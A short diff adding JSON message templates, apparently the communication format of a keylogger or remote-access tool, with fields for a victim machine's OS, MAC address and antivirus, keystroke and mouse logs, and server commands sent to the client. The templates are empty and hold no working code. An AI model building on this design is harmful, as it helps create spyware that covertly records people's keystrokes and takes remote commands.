@@ -1,0 +1,33 @@
+/* first connection */
+{
+  "os":"",
+  "mac":"",
+  "antivirus":""
+}
+/* logs for keystroke */
+{
+  "timestamp": "",
+  "proccess": "",
+  "data": "",
+  "type": "KEYSTROKE"
+}
+
+/*logs for mouse movement and click*/
+
+{
+  "timestamp": "",
+  "proccess": "",
+  "data": {
+    "click": "",
+    "x": 0,
+    "y": 0
+  },
+  "type": "MOUSE"
+}
+
+/*server command send to the client*/
+
+{
+  "type": "",
+  "data": ""
+}
